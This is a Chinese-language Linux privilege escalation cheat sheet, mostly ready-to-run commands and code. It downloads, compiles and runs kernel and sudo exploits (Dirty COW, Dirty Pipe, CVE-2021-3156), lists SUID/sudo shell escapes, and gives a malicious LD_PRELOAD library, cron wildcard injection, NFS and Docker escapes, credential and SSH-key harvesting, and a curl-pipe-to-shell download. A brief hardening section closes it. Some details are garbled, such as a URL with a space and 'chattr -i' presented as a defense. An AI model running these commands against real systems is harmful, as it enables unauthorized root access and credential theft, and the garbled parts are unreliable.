# Linux漏洞提权

Linux提权是通过利用系统漏洞、配置错误或弱口令将普通用户权限提升到root的过程。本文档涵盖常见的Linux提权漏洞和利用技术。

## 1 信息收集

### 1.1 系统基本信息

```bash
# 查看内核版本和发行版
uname -a
cat /etc/issue
cat /etc/*-release
cat /etc/lsb-release

# 查看架构
dpkg --print-architecture
arch
getconf LONG_BIT

# 查看已运行时间
uptime
w

# 查看当前用户
whoami
id
groups

# 查看其他用户
cat /etc/passwd | grep -v nologin
last
lastlog
```

### 1.2 应用和服务

```bash
# 查看运行中的服务
ps aux
ps -ef
top
htop

# 查看安装的软件
dpkg -l
rpm -qa
yum list installed
conda list

# 查看启动服务
systemctl list-units --type=service --state=running
ls /etc/init.d/
ls /etc/rc*.d/

# 查看定时任务
crontab -l
crontab -e
ls -la /etc/cron*
ls -la /var/spool/cron/
```

### 1.3 网络信息

```bash
# 网络配置
ifconfig
ip addr
route
netstat -tunp
ss -tunp

# 查看网络共享
showmount -e
mount
df -h

# 查看NFC (Network File Controls)
nfsd status
cat /etc/exports
```

### 1.4 敏感文件

```bash
# 查看可读Shadow文件
cat /etc/shadow
unshadow /etc/passwd /etc/shadow

# 查看SSH密钥
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa
cat ~/.ssh/id_ecdsa
cat ~/.ssh/id_ed25519

# 查看配置文件
ls -la /etc/*.conf
grep -r "password" /etc/*.conf 2>/dev/null
```

## 2 内核漏洞提权

### 2.1 内核版本检测

```bash
# 查看内核版本
uname -r
cat /proc/version
cat /etc/issue

# 搜索漏洞
searchsploit "Linux Kernel"
searchsploit "Ubuntu 16.04"
```

### 2.2 常用内核漏洞

| 漏洞编号 | 影响版本 | 描述 |
|----------|----------|------|
| CVE-2016-5195 | 2.6.22-3.9 (2007-2016) | Dirty COW (写时复制) |
| CVE-2017-16995 | 4.14-4.17 | eBPF提权 |
| CVE-2021-3156 | Ubuntu等 | sudo堆溢出 |
| CVE-2022-0847 | 5.8-5.16 | Dirty Pipe |
| CVE-2023-32233 | Linux 5.15-6.3 | nft_compat绕过 |
| CVE-2023-0266 | Linux 5.10-6.2 | ALSA堆漏洞 |

### 2.3 漏洞利用

#### Dirty COW (CVE-2016-5195)

```bash
# 编译exploit
wget https://www.exploit-db.com/raw/40616 -O dirtycow.c
gcc -pthread dirtycow.c -o dirtycow -lcrypt

# 执行exploit
./dirtycow

# 新增root用户: dirtycow / 密码: whatever
```

#### sudo缓冲区溢出 (CVE-2021-3156)

```bash
# 下载并编译
wget https://github.com/blasty/CVE-2021-3156/archive/refs/heads/main.zip
unzip main.zip
cd CVE-2021-3156-main
make

# 执行
./sudo-hax-me-a-sidesplitter
```

#### Dirty Pipe (CVE-2022-0847)

```bash
# 适用于Linux 5.8-5.16
wget https://github.com/AlexisAhmed/CVE-2022-0847/raw/main/exploit.py
python3 exploit.py

# 或使用C编写版本
wget https://raw.githubusercontent.com/Arinerr/CVE-2022-0847/main/ exploitation.c
gcc exploitation.c -o exploitation
./exploitation
```

## 3 SUID/SGID提权

### 3.1 查找SUID文件

```bash
# 查找所有SUID文件
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
find / -uid 0 -perm -4000 -type f 2>/dev/null

# 查找SGID文件
find / -perm -2000 -type f 2>/dev/null

# 查找可疑的SUID文件
find / -perm -4000 -exec ls -la {} \; 2>/dev/null | grep -v "lib\|systemd"
```

### 3.2 常见可利用SUID程序

| 程序 | 路径 | 利用方式 |
|------|------|----------|
| nmap | /usr/bin/nmap | nmap --interactive 进入交互模式后执行 `!sh` |
| vim | /usr/bin/vim | vim -c '!sh' |
| find | /usr/bin/find | find . -exec /bin/sh -p \; -quit |
| bash | /bin/bash | bash -p |
| less | /usr/bin/less | less /etc/passwd 在底部执行 `!sh` |
| more | /usr/bin/more | more /etc/passwd 在底部执行 `!sh` |
| awk | /usr/bin/awk | awk 'BEGIN {system("/bin/sh")}' |
| perl | /usr/bin/perl | perl -e 'exec "/bin/sh";' |
| python | /usr/bin/python | python -c 'import os;os.system("/bin/sh")' |
| ruby | /usr/bin/ruby | ruby -e 'exec "/bin/sh"' |
| cp | /usr/bin/cp | 复制/etc/shadow到可读位置 |
| tar | /usr/bin/tar | tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh |
| wget | /usr/bin/wget | wget --use-askpass=DIRECT /bin/sh |

### 3.3 GTFOBins

```bash
# GTFOBins是一个收录SUID/Sudo利用的工具网站
# https://gtfobins.github.io/

# 常用查找方法
# 在线搜索gtfobins + SUID程序名

# 离线查询
searchsploit gtfobins
```

## 4 Sudo配置错误提权

### 4.1 查找Sudo配置

```bash
# 查看当前用户可sudo的命令
sudo -l

# 查看sudoers文件
cat /etc/sudoers
cat /etc/sudoers.d/*

# 检查特定程序的sudo配置
sudo -l program_name
```

### 4.2 常见Sudo利用

#### find提权

```bash
# find的-exec参数
sudo find . -exec /bin/sh -p \; -quit

# 所有文件
sudo find / -name "*.txt" -exec /bin/sh -p \; -quit
```

#### nmap提权

```bash
# 旧版本nmap (2.02-5.21)
sudo nmap --interactive
!sh
```

#### vim提权

```bash
# vim正常模式
sudo vim -c '!sh'
# 或
sudo vim
:!sh
```

#### less/more/awk提权

```bash
# less
sudo less /etc/passwd
!/bin/sh

# more
sudo more /etc/passwd
!/bin/sh

# awk
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### python/perl/ruby提权

```bash
# python
sudo python -c 'import os;os.system("/bin/sh")'

# perl
sudo perl -e 'exec "/bin/sh";'

# ruby
sudo ruby -e 'exec "/bin/sh"'
```

### 4.3 LD_PRELOAD利用

```bash
# 如果sudo -l显示env_keep+=LD_PRELOAD

# 创建恶意共享库
cat > /tmp/shell.c << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setresuid(0,0,0);
    system("/bin/bash -p");
}
EOF

gcc -shared -fPIC -o /tmp/shell.so /tmp/shell.c

# 执行
sudo LD_PRELOAD=/tmp/shell.so <command>
# 例如
sudo LD_PRELOAD=/tmp/shell.so apache2
```

## 5 计划任务提权

### 5.1 查看定时任务

```bash
# 系统定时任务
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# 用户定时任务
crontab -l
crontab -e
ls -la /var/spool/cron/crontabs/
```

### 5.2 利用计划任务

```bash
# 1. 任务脚本可写
# 查看脚本内容
cat /etc/cron.d/script.sh
# 如果脚本所在目录或文件可写，替换内容

# 2. 通配符注入
# 如果cron任务使用tar打包目录，可利用通配符注入
# 假设任务为: cd /backup && tar cf archive *
# 注入:
echo 'cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash' > /home/user/run.sh
echo "" > "--checkpoint-action=exec=bash run.sh"
echo "" > "--checkpoint=1"
# 当tar执行时会创建这些文件，触发注入

# 3. 寻找PATH变量中的可写目录
echo 'cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash' > /usr/local/bin/command
```

## 6 NFS提权

### 6.1 检查NFS共享

```bash
# 查看NFS配置
cat /etc/exports

# 显示导出列表
showmount -e localhost
showmount -e target_ip

# 常用NFS配置错误
# no_root_squash - root用户创建的文件保留root权限
# all_squash - 所有用户映射为nobody
```

### 6.2 利用NFS无root_squash

```bash
# 在攻击机器上
mkdir /tmp/nfs
mount -o rw,vers=2 target_ip:/shared /tmp/nfs

# 创建SUID文件
gcc -o /tmp/nfs/shell /tmp/shell.c
chmod 4777 /tmp/nfs/shell

# 在目标机器上执行
/tmp/nfs/shell
```

## 7 密码和密钥提权

### 7.1 密码搜索

```bash
# 在配置文件中搜索密码
grep -r "password" /etc/*.conf 2>/dev/null
grep -r "password" /var/www/*.php 2>/dev/null
grep -r "password" /var/www/html/*.txt 2>/dev/null

# 在日志中搜索
grep -r "password" /var/log/*.log 2>/dev/null

# 在历史记录中搜索
cat ~/.bash_history
cat ~/.mysql_history
cat ~/.psql_history

# 在内存中搜索 (需要root)
strings /dev/mem | grep -i password
```

### 7.2 SSH密钥利用

```bash
# 查找SSH密钥
ls -la ~/.ssh/
cat ~/.ssh/authorized_keys
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa

# 如果有私钥，尝试登录其他机器
chmod 600 id_rsa
ssh -i id_rsa user@target

# 查找known_hosts关联的主机
cat ~/.ssh/known_hosts
```

### 7.3 密码复用

```bash
# 查看可用的用户
cat /etc/passwd | grep -E "sh$"
# 尝试使用相同密码
su - username
```

## 8 Docker/容器提权

### 8.1 Docker组提权

```bash
# 检查是否在docker组
groups
grep docker /etc/group

# 如果在docker组，可以mount宿主机文件系统
docker run -v /:/host -it alpine
# 在容器内: chroot /host
```

### 8.2 Docker Socket利用

```bash
# 检查docker.sock
ls -la /var/run/docker.sock

# 如果可访问
docker ps
docker exec -it container_id /bin/bash

# 启动特权容器
docker run -it --privileged ubuntu bash
```

## 9 密码哈希破解

### 9.1 提取密码哈希

```bash
# /etc/shadow 需要root权限
sudo cat /etc/shadow

# 提取特定用户
grep root /etc/shadow
```

### 9.2 破解方法

```bash
# 使用hashcat
# MD5: hashcat -m 500 hashes.txt wordlist.txt
# SHA512: hashcat -m 1800 hashes.txt wordlist.txt

# 使用john the ripper
john --wordlist=wordlist.txt hashes.txt

# 使用unshadow
unshadow /etc/passwd /etc/shadow > combined.txt
john --wordlist=wordlist.txt combined.txt
```

## 10 常用提权工具

### 10.1 LinPEAS

```bash
# 下载并执行
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 本地执行
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### 10.2 LinEnum

```bash
wget https://github.com/rebootuser/LinEnum/archive/refs/heads/master.zip
unzip master.zip
./LinEnum.sh -s -r report.txt -e /tmp/ -t
```

### 10.3 linux-exploit-suggester

```bash
wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
chmod +x linux-exploit-suggester.sh
./linux-exploit-suggester.sh
```

### 10.4 pspy

```bash
# 监控进程执行
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
chmod +x pspy64
./pspy64
```

## 11 SudoBuffer Overflow (CVE-2021-3156) 详细利用

```bash
# 检测
sudo -V | grep version
dpkg -l | grep sudo

# 方式1: Baron Samedit
wget https://github.com/blasty/CVE-2021-3156/archive/refs/heads/main.zip
unzip main.zip
cd CVE-2021-3156-main
make
./sudo-hax-me-a-sidesplitter

# 方式2: 使用已编译版本
wget https://github.com/nedwill/sudo-baron-samedit/releases/download/v1.0/sudo-baron-samedit
chmod +x sudo-baron-samedit
./sudo-baron-samedit
```

## 12 防御措施

```bash
# 1. 内核安全更新
apt update && apt upgrade -y
yum update -y

# 2. 限制SUID文件
find / -perm -4000 -type f 2>/dev/null | xargs chmod -s
# 或使用chattr
chattr -i /usr/bin/passwd

# 3. sudoers配置
# 使用visudo编辑
# 删除不必要的sudo权限
# 禁止危险命令的NOEXEC

# 4. 密码策略
# /etc/security/pwquality.conf
# 最小长度12位，包含特殊字符

# 5. 禁用或限制Ctrl+Alt+Del
# systemctl mask ctrl-alt-del.target

# 6. 禁止root登录
# 编辑 /etc/ssh/sshd_config
# PermitRootLogin no

# 7. Seccomp/AppArmor/SELinux
# 启用并正确配置

# 8. 监控
# 部署auditd
apt install auditd
systemctl enable auditd
# 监控SUID执行
echo "-a always,exit -F arch=b64 -S execve -F euid=0 -F auid>=1000 -F auid!=4294967295 -k rootcmd" >> /etc/audit/rules.d/audit.rules
```

## 13 参考资源

- PayloadsAllTheThings Linux提权: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md
- GTFOBins: https://gtfobins.github.io/
- Linux提权基础: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- RootHelper: https://github.com/NullArray/RootHelper
- LinPEAS: https://github.com/carlospolop/PEASS-ng
